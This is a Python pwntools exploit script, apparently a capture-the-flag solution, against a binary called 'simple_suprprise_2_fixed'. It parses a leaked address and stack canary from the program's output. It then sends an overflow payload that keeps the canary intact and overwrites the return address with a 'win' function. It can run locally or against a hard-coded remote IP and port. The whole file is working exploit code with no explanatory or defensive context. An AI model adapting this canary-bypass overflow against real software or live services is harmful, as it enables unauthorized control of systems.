from pwn import *
import sys

context.binary = "./simple_suprprise_2_fixed"
context.log_level = "info"

win = 0x401260

if len(sys.argv) > 1 and sys.argv[1] == "remote":
    io = remote("109.233.56.90", 11612)
else:
    io = process("./simple_suprprise_2_fixed")

io.recvuntil(b"I am here ")
leak = io.recvline().split()
main_leak = int(leak[0], 16)
canary = int(leak[1], 16)
log.info("main = %#x", main_leak)
log.info("canary = %#x", canary)

io.sendafter(b"Login:", b"pad\n")
io.recvuntil(b"Welcome,")

payload = b"A" * 44
payload += p32(canary)
payload += b"B" * 8
payload += p64(win)
io.send(payload)

print(io.recvall(timeout=3).decode(errors="replace"))
